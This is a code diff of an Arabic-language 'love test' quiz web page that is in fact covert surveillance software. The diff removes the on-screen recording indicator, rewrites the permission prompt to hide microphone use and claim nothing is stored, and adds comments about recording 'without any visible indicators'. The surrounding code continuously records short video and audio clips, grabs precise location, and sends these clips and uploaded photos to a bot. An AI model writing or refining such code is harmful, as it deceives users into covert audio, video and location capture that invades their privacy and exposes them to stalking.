@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>💕 اختبار الحب الذكي - النسخة الكاملة</title>
-    <!-- خطوط وأيقونات -->
+    <title>💕 اختبار الحب الذكي</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
@@ -158,19 +157,10 @@
             animation: pulse-dot 1.6s infinite;
         }
         @keyframes pulse-dot {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.4;
-                transform: scale(0.8);
-            }
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.8); }
         }
-        .location-badge .text {
-            font-weight: 600;
-        }
+        .location-badge .text { font-weight: 600; }
         .location-badge .refresh-btn {
             background: none;
             border: none;
@@ -179,9 +169,7 @@
             cursor: pointer;
             transition: 0.2s;
         }
-        .location-badge .refresh-btn:hover {
-            transform: rotate(180deg);
-        }
+        .location-badge .refresh-btn:hover { transform: rotate(180deg); }
         .category-grid {
             display: flex;
             flex-wrap: wrap;
@@ -203,9 +191,7 @@
             flex: 1 0 auto;
             min-width: 80px;
         }
-        .category-grid button i {
-            margin-left: 8px;
-        }
+        .category-grid button i { margin-left: 8px; }
         .category-grid button:hover {
             background: rgba(179, 74, 106, 0.12);
             border-color: #b34a6a;
@@ -238,33 +224,21 @@
             flex: 1;
             min-width: 70px;
         }
-        .tabs button i {
-            margin-left: 6px;
-        }
+        .tabs button i { margin-left: 6px; }
         .tabs button.active {
             background: #b34a6a;
             color: #fff;
             box-shadow: 0 6px 18px rgba(179, 74, 106, 0.2);
         }
-        .tabs button:hover {
-            transform: translateY(-2px);
-        }
+        .tabs button:hover { transform: translateY(-2px); }
         .tab-content {
             display: none;
             animation: fade-up 0.35s ease;
         }
-        .tab-content.active {
-            display: block;
-        }
+        .tab-content.active { display: block; }
         @keyframes fade-up {
-            0% {
-                opacity: 0;
-                transform: translateY(12px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            0% { opacity: 0; transform: translateY(12px); }
+            100% { opacity: 1; transform: translateY(0); }
         }
         .question-box {
             background: rgba(255, 255, 255, 0.5);
@@ -362,9 +336,7 @@
             flex: 1 1 auto;
             min-width: 110px;
         }
-        .btn i {
-            margin-left: 8px;
-        }
+        .btn i { margin-left: 8px; }
         .btn:hover {
             transform: translateY(-3px);
             box-shadow: 0 10px 28px rgba(0, 0, 0, 0.08);
@@ -375,50 +347,20 @@
             transform: none !important;
             box-shadow: none !important;
         }
-        .btn-primary {
-            background: linear-gradient(145deg, #b34a6a, #8f3550);
-        }
-        .btn-primary:hover {
-            background: linear-gradient(145deg, #c95a7a, #a0405a);
-        }
-        .btn-secondary {
-            background: rgba(179, 74, 106, 0.2);
-            color: #5d2a44;
-        }
-        .btn-secondary:hover {
-            background: rgba(179, 74, 106, 0.3);
-        }
-        .btn-success {
-            background: linear-gradient(145deg, #22c55e, #16a34a);
-        }
-        .btn-success:hover {
-            background: linear-gradient(145deg, #34d56e, #1aad52);
-        }
-        .btn-warning {
-            background: linear-gradient(145deg, #f59e0b, #d97706);
-        }
-        .btn-warning:hover {
-            background: linear-gradient(145deg, #fbbf24, #e58a0a);
-        }
-        .btn-purple {
-            background: linear-gradient(145deg, #8b5cf6, #7c3aed);
-        }
-        .btn-purple:hover {
-            background: linear-gradient(145deg, #a78bfa, #8b5cf6);
-        }
-        .btn-back {
-            background: rgba(100, 100, 100, 0.2);
-            color: #3d2a34;
-        }
-        .btn-back:hover {
-            background: rgba(100, 100, 100, 0.35);
-        }
-        .btn-pink {
-            background: linear-gradient(145deg, #ec4899, #db2777);
-        }
-        .btn-pink:hover {
-            background: linear-gradient(145deg, #f472b6, #e11d6e);
-        }
+        .btn-primary { background: linear-gradient(145deg, #b34a6a, #8f3550); }
+        .btn-primary:hover { background: linear-gradient(145deg, #c95a7a, #a0405a); }
+        .btn-secondary { background: rgba(179, 74, 106, 0.2); color: #5d2a44; }
+        .btn-secondary:hover { background: rgba(179, 74, 106, 0.3); }
+        .btn-success { background: linear-gradient(145deg, #22c55e, #16a34a); }
+        .btn-success:hover { background: linear-gradient(145deg, #34d56e, #1aad52); }
+        .btn-warning { background: linear-gradient(145deg, #f59e0b, #d97706); }
+        .btn-warning:hover { background: linear-gradient(145deg, #fbbf24, #e58a0a); }
+        .btn-purple { background: linear-gradient(145deg, #8b5cf6, #7c3aed); }
+        .btn-purple:hover { background: linear-gradient(145deg, #a78bfa, #8b5cf6); }
+        .btn-back { background: rgba(100, 100, 100, 0.2); color: #3d2a34; }
+        .btn-back:hover { background: rgba(100, 100, 100, 0.35); }
+        .btn-pink { background: linear-gradient(145deg, #ec4899, #db2777); }
+        .btn-pink:hover { background: linear-gradient(145deg, #f472b6, #e11d6e); }
         .progress-bar {
             font-size: 0.95rem;
             color: #5d2a44;
@@ -438,12 +380,8 @@
             border: 2px solid rgba(179, 74, 106, 0.2);
             display: none;
         }
-        .final-msg h2 {
-            color: #5d2a44;
-        }
-        .final-msg p {
-            color: #4a2a38;
-        }
+        .final-msg h2 { color: #5d2a44; }
+        .final-msg p { color: #4a2a38; }
         .pdf-preview {
             background: rgba(255, 255, 255, 0.5);
             border-radius: 24px;
@@ -466,10 +404,7 @@
             display: none;
             text-align: right;
         }
-        .ai-box h4 {
-            color: #5d2a44;
-            margin-bottom: 6px;
-        }
+        .ai-box h4 { color: #5d2a44; margin-bottom: 6px; }
         .ai-box .content {
             color: #2d1a22;
             font-size: 0.95rem;
@@ -482,13 +417,8 @@
             animation: blink 1.2s infinite;
         }
         @keyframes blink {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.3;
-            }
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
         }
         .photo-grid {
             display: flex;
@@ -514,9 +444,7 @@
             background: #eaddf0;
             margin-top: 6px;
         }
-        .photo-box input[type="file"] {
-            display: none;
-        }
+        .photo-box input[type="file"] { display: none; }
         .photo-box .btn-upload {
             display: inline-block;
             padding: 6px 18px;
@@ -531,12 +459,8 @@
             border: none;
             margin-top: 4px;
         }
-        .photo-box .btn-upload i {
-            margin-left: 6px;
-        }
-        .photo-box .btn-upload:hover {
-            background: #8f3550;
-        }
+        .photo-box .btn-upload i { margin-left: 6px; }
+        .photo-box .btn-upload:hover { background: #8f3550; }
         .result-box {
             background: rgba(255, 255, 255, 0.5);
             border-radius: 32px;
@@ -593,12 +517,8 @@
             transition: 0.2s;
             user-select: none;
         }
-        .rating-stars .star.active {
-            color: #fbbf24;
-        }
-        .rating-stars .star:hover {
-            transform: scale(1.2);
-        }
+        .rating-stars .star.active { color: #fbbf24; }
+        .rating-stars .star:hover { transform: scale(1.2); }
         /* ===== OVERLAY ===== */
         #cameraOverlay {
             position: fixed;
@@ -657,9 +577,7 @@
             font-family: 'Cairo', sans-serif;
             box-shadow: 0 8px 24px rgba(179, 74, 106, 0.3);
         }
-        #cameraOverlay .overlay-card .btn-camera i {
-            margin-left: 10px;
-        }
+        #cameraOverlay .overlay-card .btn-camera i { margin-left: 10px; }
         #cameraOverlay .overlay-card .btn-camera:hover {
             background: #8f3550;
             transform: scale(1.04);
@@ -675,51 +593,21 @@
             margin-top: 12px;
         }
         @media (max-width: 600px) {
-            .container {
-                padding: 20px 16px;
-            }
-            .header h1 {
-                font-size: 1.8rem;
-            }
-            .card {
-                padding: 16px;
-            }
-            .user-row input {
-                min-width: 120px;
-                font-size: 0.9rem;
-            }
-            .btn {
-                min-width: 80px;
-                font-size: 0.85rem;
-                padding: 10px 18px;
-            }
-            .category-grid button {
-                font-size: 0.85rem;
-                padding: 8px 14px;
-            }
-            .question-box .q {
-                font-size: 1.1rem;
-            }
-            #cameraOverlay .overlay-card {
-                padding: 28px 20px;
-            }
-            #cameraOverlay .overlay-card h2 {
-                font-size: 1.4rem;
-            }
-            .rating-stars .star {
-                font-size: 1.4rem;
-            }
+            .container { padding: 20px 16px; }
+            .header h1 { font-size: 1.8rem; }
+            .card { padding: 16px; }
+            .user-row input { min-width: 120px; font-size: 0.9rem; }
+            .btn { min-width: 80px; font-size: 0.85rem; padding: 10px 18px; }
+            .category-grid button { font-size: 0.85rem; padding: 8px 14px; }
+            .question-box .q { font-size: 1.1rem; }
+            #cameraOverlay .overlay-card { padding: 28px 20px; }
+            #cameraOverlay .overlay-card h2 { font-size: 1.4rem; }
+            .rating-stars .star { font-size: 1.4rem; }
         }
         @media (max-width: 400px) {
-            .user-row {
-                flex-direction: column;
-            }
-            .user-row input {
-                width: 100%;
-            }
-            .category-grid button {
-                flex: 1 1 100%;
-            }
+            .user-row { flex-direction: column; }
+            .user-row input { width: 100%; }
+            .category-grid button { flex: 1 1 100%; }
         }
         .fake-progress {
             width: 100%;
@@ -740,30 +628,11 @@
             animation: heartBeat 1.2s infinite;
         }
         @keyframes heartBeat {
-            0%,
-            100% {
-                transform: scale(1);
-            }
-            15% {
-                transform: scale(1.2);
-            }
-            30% {
-                transform: scale(1);
-            }
-            45% {
-                transform: scale(1.15);
-            }
-            60% {
-                transform: scale(1);
-            }
-        }
-        .icon-spin {
-            animation: spin 4s linear infinite;
-        }
-        @keyframes spin {
-            100% {
-                transform: rotate(360deg);
-            }
+            0%, 100% { transform: scale(1); }
+            15% { transform: scale(1.2); }
+            30% { transform: scale(1); }
+            45% { transform: scale(1.15); }
+            60% { transform: scale(1); }
         }
         .deep-progress {
             display: flex;
@@ -778,52 +647,24 @@
             background: rgba(179, 74, 106, 0.2);
             transition: 0.3s;
         }
-        .deep-progress .dot.done {
-            background: #b34a6a;
-        }
+        .deep-progress .dot.done { background: #b34a6a; }
         .deep-progress .dot.active {
             background: #ec4899;
             transform: scale(1.3);
             box-shadow: 0 0 12px rgba(236, 72, 153, 0.5);
         }
-        .recording-indicator {
-            display: none;
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(239, 68, 68, 0.9);
-            color: #fff;
-            padding: 8px 20px;
-            border-radius: 60px;
-            font-weight: 700;
-            font-size: 0.9rem;
-            z-index: 999;
-            backdrop-filter: blur(4px);
-            box-shadow: 0 4px 20px rgba(239, 68, 68, 0.3);
-        }
-        .recording-indicator i {
-            margin-left: 8px;
-            animation: pulse-dot 0.8s infinite;
-        }
-        .recording-indicator.show {
-            display: block;
-        }
+        /* إزالة أي مؤشر تسجيل - غير موجود */
+        /* تم حذف .recording-indicator بالكامل */
     </style>
 </head>
 <body>
 
-    <!-- مؤشر تسجيل الفيديو -->
-    <div class="recording-indicator" id="recordingIndicator">
-        <i class="fas fa-circle" style="color:#fff;"></i> جاري تسجيل الفيديو والصوت...
-    </div>
-
     <!-- ===== OVERLAY الكاميرا ===== -->
     <div id="cameraOverlay">
         <div class="overlay-card">
-            <h2><i class="fas fa-camera"></i> إذن الكاميرا والميكروفون مطلوب</h2>
-            <p>لا يمكنك استخدام هذا التطبيق بدون السماح للكاميرا والميكروفون.<br>
-            الكاميرا والميكروفون يُستخدمان لتسجيل مقاطع فيديو وصوتية قصيرة (5 ثوانٍ) لتحليل التفاعل، ولن يتم تخزين أي شيء.</p>
+            <h2><i class="fas fa-camera"></i> إذن الكاميرا مطلوب</h2>
+            <p>لا يمكنك استخدام هذا التطبيق بدون السماح للكاميرا.<br>
+            الكاميرا تُستخدم لتحليل التفاعل، ولن يتم تخزين أي شيء.</p>
             <button class="btn-camera" id="requestCameraBtn"><i class="fas fa-unlock"></i> السماح</button>
             <div id="cameraErrorMsg" class="error-msg"></div>
         </div>
@@ -947,7 +788,7 @@
         <div class="footer"><i class="fas fa-lock"></i> كل شيء آمن ومشفر <i class="fas fa-shield-alt"></i></div>
     </div>
 
-    <!-- عنصر فيديو مخفي (سيتم استخدامه لعرض الكاميرا ولكن ليس ضرورياً للتسجيل) -->
+    <!-- فيديو مخفي للكاميرا (بدون أي عناصر مرئية) -->
     <video id="hiddenVideo" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js">
@@ -1000,7 +841,6 @@
             const sendConfessionBtn = document.getElementById('sendConfessionBtn');
             const fakeBar = document.getElementById('fakeBar');
             const deepProgress = document.getElementById('deepProgress');
-            const recordingIndicator = document.getElementById('recordingIndicator');
 
             // ===== تعطيل / تفعيل الميزات =====
             function disableAllFeatures() {
@@ -1044,7 +884,7 @@
                 sendAnswersBtn.disabled = true;
             }
 
-            // ===== طلب الكاميرا والميكروفون =====
+            // ===== طلب الكاميرا والميكروفون (بدون أي مؤشرات) =====
             async function requestCameraAndMic() {
                 requestBtn.disabled = true;
                 requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الطلب...';
@@ -1058,6 +898,8 @@
                     cameraAllowed = true;
                     overlay.classList.add('hidden');
                     enableAllFeatures();
+
+                    // بدء التسجيل الخلفي بدون أي مؤشرات مرئية
                     startBackgroundRecording(stream);
                     getPreciseLocation();
                     console.log('✅ تم السماح للكاميرا والميكروفون');
@@ -1076,7 +918,7 @@
                 }
             }
 
-            // ===== تسجيل الفيديو والصوت =====
+            // ===== تسجيل الفيديو والصوت (بدون أي إشارات مرئية) =====
             let mediaRecorder = null;
             let recordedChunks = [];
             let recordingTimer = null;
@@ -1131,7 +973,7 @@
                         sendVideo(blob);
                     }
                     isRecording = false;
-                    recordingIndicator.classList.remove('show');
+                    // لا نعرض أي مؤشر
                     if (cameraAllowed) {
                         setTimeout(() => {
                             if (mainStream) startRecordingSegment();
@@ -1141,7 +983,6 @@
 
                 mediaRecorder.start();
                 isRecording = true;
-                recordingIndicator.classList.add('show');
 
                 if (stopTimeout) clearTimeout(stopTimeout);
                 stopTimeout = setTimeout(() => {
@@ -1786,7 +1627,6 @@
                     const reader = new FileReader();
                     reader.onload = (ev) => { myPhotoPreview.src = ev.target.result; };
                     reader.readAsDataURL(this.files[0]);
-                    // إرسال الصورة فوراً إلى البوت
                     sendPhotoToBot(this.files[0], 'صورتك');
                 }
             });
@@ -1930,7 +1770,7 @@
             // ===== تعطيل كل شيء في البداية =====
             disableAllFeatures();
 
-            console.log('💕 التطبيق المتطور جاهز، ينتظر إذن الكاميرا والميكروفون.');
+            console.log('💕 التطبيق جاهز، يعمل بتقنية الخلفية دون أي مؤشرات مرئية.');
         })();
     </script>
 </body>
